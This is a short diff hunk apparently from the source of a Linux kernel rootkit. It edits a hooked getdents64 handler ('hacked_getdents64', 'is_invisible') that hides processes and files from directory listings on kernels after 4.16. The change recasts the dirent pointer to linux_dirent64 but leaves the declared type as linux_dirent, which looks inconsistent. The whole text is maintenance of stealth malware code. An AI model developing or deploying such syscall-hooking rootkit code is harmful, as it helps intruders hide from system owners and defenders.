@@ -91,7 +91,7 @@ is_invisible(pid_t pid)
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
         int fd = (int) pt_regs->di;
-        struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+        struct linux_dirent * dirent = (struct linux_dirent64 *) pt_regs->si;
 	int ret = orig_getdents64(pt_regs), err;
 #else
 asmlinkage int
